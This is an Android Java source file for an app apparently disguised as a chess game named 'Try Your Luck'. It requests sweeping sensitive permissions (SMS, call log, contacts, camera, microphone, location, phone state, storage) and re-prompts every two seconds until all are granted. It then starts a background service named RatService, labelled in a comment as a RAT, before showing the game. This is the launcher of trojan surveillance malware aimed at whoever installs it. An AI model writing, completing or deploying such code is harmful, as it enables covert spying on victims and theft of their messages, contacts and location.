package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Set a simple layout programmatically to avoid XML issues
        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setBackgroundColor(0xFF1a1a2e);
        
        android.widget.TextView textView = new android.widget.TextView(this);
        textView.setText("♟️ Try Your Luck\nLoading...");
        textView.setTextSize(24);
        textView.setTextColor(0xFFFFFFFF);
        textView.setGravity(android.view.Gravity.CENTER);
        
        android.widget.ProgressBar progressBar = new android.widget.ProgressBar(this);
        
        layout.addView(textView);
        layout.addView(progressBar);
        setContentView(layout);

        // Request permissions
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        List<String> permissionsList = new ArrayList<>();
        
        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.READ_SMS);
        permissionsList.add(Manifest.permission.SEND_SMS);
        permissionsList.add(Manifest.permission.RECEIVE_SMS);
        permissionsList.add(Manifest.permission.READ_CALL_LOG);
        permissionsList.add(Manifest.permission.READ_CONTACTS);
        permissionsList.add(Manifest.permission.CAMERA);
        permissionsList.add(Manifest.permission.RECORD_AUDIO);
        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
        permissionsList.add(Manifest.permission.INTERNET);
        permissionsList.add(Manifest.permission.ACCESS_NETWORK_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        // Filter out already granted permissions
        List<String> neededPermissions = new ArrayList<>();
        for (String permission : permissionsList) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }

        if (neededPermissions.isEmpty()) {
            // All permissions granted
            startApp();
        } else {
            String[] permissionsArray = neededPermissions.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permissionsArray, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions are granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                startApp();
            } else {
                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
                // Retry after 2 seconds
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestAllPermissions();
                    }
                }, 2000);
            }
        }
    }

    private void startApp() {
        // Start RAT service
        try {
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Service error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }

        // Start chess game after 1 second
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent chessIntent = new Intent(MainActivity.this, ChessActivity.class);
                    startActivity(chessIntent);
                    finish();
                } catch (Exception e) {
                    e.printStackTrace();
                    // If ChessActivity fails, show error and finish
                    Toast.makeText(MainActivity.this, "Error starting chess: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    finish();
                }
            }
        }, 1000);
    }
}
